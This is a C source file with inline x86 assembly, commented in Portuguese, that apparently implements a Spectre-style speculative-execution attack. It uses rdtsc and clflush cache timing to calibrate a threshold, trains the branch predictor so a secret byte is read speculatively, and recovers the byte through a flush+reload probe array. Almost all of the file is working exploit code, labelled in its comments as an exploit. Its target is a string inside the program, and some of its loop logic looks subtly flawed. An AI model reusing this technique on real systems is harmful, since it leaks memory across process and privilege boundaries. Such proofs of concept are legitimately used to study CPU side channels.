#include <stdio.h>
#include <stdlib.h>

#define NUM_ITERACOES 10
#define CACHE_LINE_LEN	128
#define LEN_MEM_ARRAY	50
#define TRIAL_TIMES	 1000

static inline void Flush(void *);

unsigned GetDS(){
	unsigned ds;
	asm __volatile__(
			"mov %%DS , %0"
			: "=r"(ds) :
			);
	return ds;
}
void PrintLista(int lista[])
{
	printf("Possiveis valores: ");
	for (int i=0; lista[i]!=-1;i++)
	{
		printf(" %i = %c",lista[i],lista[i]);
	}
	printf("\n");
}

char p1[] = 	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";


static inline long ProbeFlush(void *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%al   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
	Flush(addr);
  return tempo;
}


static inline long Probe(void *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%al   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
  return tempo;
}

static inline void Flush(void *addr)
{
	asm __volatile__(
			"mfence		;"
			"clflush 0(%0)	;"
			"mfence		;"
			"lfence		;"
			: : "r" (addr)
			);
}





unsigned Treshold(void *baseSrc)
{

	void* base=baseSrc;
	unsigned i=0;
	unsigned j=0;
	unsigned probe;
	unsigned long long totalComFlush=0;
	unsigned long long totalSemFlush=0;
	//Flush(base);
	while (i<NUM_ITERACOES)
	{
		for (j=0;j<255;j++)
		{
		
		
			//Flush(base+j*4096);
			probe=Probe(base+j*4096);
			totalComFlush+=probe;
			//printf("com flush %8X\n",probe);
		
			probe=ProbeFlush(base+j*4096);
			totalSemFlush+=probe;
			i++;
		
			//printf("sem flush %8X\n",probe);
	
		}
	}
	totalComFlush=totalComFlush/(i);
	totalSemFlush=totalSemFlush/(i);
	printf("media com flush = %08X\n",(unsigned)totalComFlush);
	printf("media sem flush = %08X\n",(unsigned )totalSemFlush);
		

	return (totalComFlush+totalSemFlush)/2;

}

void fillArray(unsigned long array[],unsigned long addr)
{
	for(int i=0;i<200;i++){
		array[i]=0;
	}
	array[101]=addr;
}


static inline void FlushAll(void *base)
{
	register char *inicio=base;
	for (register int i=0; i <= 255 ; i++){
		Flush(inicio+i*4096);
	}
}

static inline int FindSecretLineCache(void *baseSrc,unsigned treshold,int lista[])
{
	void *base=baseSrc;
	unsigned tempo;
	int i=0;
	int c=0;
	while (i<255)
	{
		
		
		tempo=Probe(base+i*4096);
		//printf("i=%u,tempo=%8x\n",i,tempo);
		if (tempo<treshold)
		{
			lista[c]=i;
			c++;
		}	
		base++;
		i++;
	}
	lista[c]=-1;
	return 0;


}

void fillArrayMemSpace(void *memspace[],void *original[])
{
	//avoid calling clflush all the time.
	void *bufferFill;
	for(int i=0;i<LEN_MEM_ARRAY;i++)
	{
		
		bufferFill=malloc(4096*256+0xFFFFFF);
		original[i]=bufferFill;
		bufferFill+=0xFFFFFF;
		bufferFill=(void *)((unsigned long)bufferFill & 0xFFFFFFFFF000000);
		memspace[i]=bufferFill;
	}
}
static inline void speculateByte(void *addr,void *base)
{
	int pseudoAlvo=255;
	int pseudoAlvo2=10;
	void *lista[TRIAL_TIMES+1];
	int x;
	int i;
	for (i=0 ; i<TRIAL_TIMES ; i++)
	{
		lista[i]=&pseudoAlvo;
	}
	lista[TRIAL_TIMES]=&pseudoAlvo2; //evil!!!

	//printf("tamanho de void= %i\n",sizeof(void *));
	//especulamos o indice 256, q é o endereço maligno;
	asm __volatile__(
			"mov %0 , %%rbx			\n" 	//probeArray
			"mov %1 , %%rcx			\n"	   //array de proibidos
			"mov $0,%%rsi					\n"
			"_read_loop:					\n"
			"						\n"	
			"	xor %%rdx,%%rdx				\n"
			"	mov (%%rcx,%%rsi,0x8),%%rax			\n" //rax agora contem o addr possivel de ataque


			"	add $87212,%%rsi				\n"
			"	sub $87212,%%rsi				\n"
			"	add $88212,%%rsi				\n"
			"	sub $88212,%%rsi				\n"


			"	cmp $1000,%%rsi				\n"
			"	jz _fim_loop				\n"
			"	mov (%%rax),%%dl			\n" //especulado dl = segredo
			"	shl $12,%%rdx				\n" //dl*4096+baseProbe acesso o dado
			"	mov (%%rbx,%%rdx),%%rdi				\n"
			"	inc %%rsi				\n"
			"					\n"
			"					\n"
			"					\n"
			"					\n"
			"					\n"
			"					\n"
			"					\n"
			"_fim_loop:					\n"
			"	nop				\n"

			: : "r" (base) , "r" (lista)
			
			);


}
int main(void)
{
	int ret,i;
	int lista[256];
	unsigned treshold;
	void *ptrArray;
	void *addr;

	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";

	void *memspace[LEN_MEM_ARRAY];
	void *original[LEN_MEM_ARRAY];

	fillArrayMemSpace(memspace,original);

	treshold=Treshold(memspace[0]);
	//treshold=0x300;

	for (i=1;i<LEN_MEM_ARRAY;i++ )
	{
	
		ptrArray=memspace[i];
		addr=(void *)segredo+(i-1);
		
		speculateByte(addr,ptrArray);
		
		//ret=*((int *)(ptrArray+(int)segredo[i-1]*4096));
		FindSecretLineCache(ptrArray,treshold,lista);
		
		PrintLista(lista);
		FlushAll(ptrArray);
		free(original[i]);	

		
	
	}

	//exit friendly
	for (i=0;i< LEN_MEM_ARRAY;i++)
	{
		//free(original[i]);
	}
	return 0;

}


















